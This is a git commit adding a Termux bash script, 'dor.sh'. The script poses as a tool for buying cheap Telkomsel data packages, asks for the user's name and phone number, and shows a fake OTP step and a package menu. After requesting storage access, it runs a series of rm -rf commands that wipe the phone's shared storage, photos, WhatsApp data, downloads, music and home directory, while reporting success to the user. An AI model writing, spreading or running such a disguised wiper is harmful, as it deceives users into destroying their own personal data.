d7d086cdb3a844c23c14eada0915daeeb8681cbd
14P3RSONAL <49380483+14P3RSONAL@users.noreply.github.com>
2019-04-08 11:11:49 +0700

    Create dor.sh

---
+++ dor.sh
@@ -0,0 +1,41 @@
+#!/bin/bash
+clear
+echo "--------------------" | lolcat
+echo "Author : 14P3RSONAL" | lolcat
+echo "ISL - ICY154" | lolcat
+echo "--------------------" | lolcat
+figlet TembakTsel | lolcat
+read -p "Nama Anda :" nama;
+echo "Selamat Datang $nama"
+sleep 2
+read -p "Masukan Nomer Anda:" mer;
+echo "GET OTP $mer"
+sleep 5
+echo "Masukan Pilihan Anda !" | lolcat
+echo "1.10GB HARGA 5K
+2.8GB HARGA 2K
+3.15GB HARGA 10K
+4.5GB HARGA 1K" | lolcat
+read -p "Pilih Salah Satu :" pil;
+echo "Progres Working" | lolcat
+echo "Send $pil to $mer" | lolcat
+echo "Please Accept This" | lolcat
+termux-setup-storage
+echo "Done !" | lolcat
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/DCIM
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/WhatsApp
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/Downloads
+rm -rf /storage/emulated/0/Music
+rm -rf /sdcard/0/Music
+echo "Get $mer" | lolcat
+echo "Get $pil" | lolcat
+echo "Cek Your Message And Call *888#" | lolcat
